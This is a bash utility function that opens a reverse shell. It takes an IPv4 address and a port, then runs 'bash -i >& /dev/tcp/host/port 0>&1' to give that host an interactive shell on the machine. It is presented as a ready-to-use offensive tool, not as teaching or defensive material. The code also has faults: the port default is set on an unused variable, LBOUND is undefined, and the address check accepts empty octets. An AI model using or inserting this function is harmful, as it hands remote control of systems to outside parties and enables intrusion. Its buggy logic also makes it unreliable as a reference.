
## Create a reverse shell connection
function reverse-shell() {
    local RHOST
    local RPORT

    local ARGUMENTS=()
    local OPTARG
    local OPTION
    while [ "${#}" -gt 0 ]; do
        OPTIND=0
        while getopts :p:h OPTION; do
            case "${OPTION}" in
                p) RPORT="${OPTARG}";;
                h) echo_label 'description'; echo_primary 'Create a reverse shell connection'
                    echo_label 'usage';      echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)'
                    return 0;;
                :) echo_error "\"${OPTARG}\" requires value"
                    return 1;;
                \?) echo_error "invalid option \"${OPTARG}\""
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            ARGUMENTS+=("${1}")
            shift
        fi
    done

    if [ "${#ARGUMENTS[@]}" -eq 0 ]; then
        echo_error 'some mandatory parameter is missing'
        echo_label 'usage'; echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)'
        return 1
    fi

    if [ "${#ARGUMENTS[@]}" -gt 1 ]; then
        echo_error "too many arguments (${#ARGUMENTS[@]})"
        echo_label 'usage'; echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)'
        return 1
    fi

    RHOST=${ARGUMENTS[${LBOUND}]}

    if [ -z "${LPORT}" ]; then
        LPORT=8080
    fi

    # host should be an ipv4
    if [[ ! "${RHOST}" =~ ^([0-9]{0,3}\.){3}[0-9]{0,3}$ ]]; then
        echo_error 'host should be an ipv4 address'
        echo_label 'usage'; echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)'
        return 1
    fi

    # port should be a positive integer
    if [[ ! "${RPORT}" =~ ^[0-9]+$ ]]; then
        echo_error 'port should be a positive integer'
        echo_label 'usage'; echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)'
        return 1
    fi

    echo_info "bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1"
    bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1
}

